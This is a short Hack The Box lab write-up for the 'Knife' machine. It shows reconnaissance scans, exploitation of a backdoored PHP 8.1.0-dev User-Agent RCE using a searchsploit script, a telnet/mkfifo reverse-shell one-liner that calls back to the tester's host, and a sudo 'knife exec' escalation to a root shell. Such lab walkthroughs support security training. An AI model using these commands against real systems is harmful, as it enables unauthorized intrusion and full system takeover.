---
layout: single
title: Knife - Hack The Box
excerpt: "Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell."
date: 2025-05-26
classes: wide
header:
  teaser: /img2/knife.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - PHP 8.1.0-dev - 'User-Agent' Remote Code Execution [RCE]
  - Abusing Sudoers Privilege (Knife Binary) [Privilege Escalation]
---


## Reconnaissance

- Nmap 

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.242
```

![](/img2/Pasted%20image%2020250526145240.png)

- Whatweb 

```bash
whatweb http://10.10.10.242/
```

![](/img2/Pasted%20image%2020250526145404.png)

## Exploitation

- PHP 8.1.0-dev User Agent RCE

```bash
searchsploit php 8.1.0-dev
```

![](/img2/Pasted%20image%2020250526145645.png)

```bash
searchsploit -m php/webapps/49933.py
```

```bash
python3 49933.py
```

![](/img2/Pasted%20image%2020250526145735.png)

- Send reverse shell

```bash
TF=$(mktemp -u);mkfifo $TF && telnet 10.10.16.7 9000 0<$TF | /bin/bash 1>$TF
```

```bash
nc -nlvp 9000
```

## Post-exploitation

- Check sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250526152256.png)

- Knife Sudoers

```bash
sudo knife exec -E 'exec "/bin/sh"'
```

![](/img2/Pasted%20image%2020250526152128.png)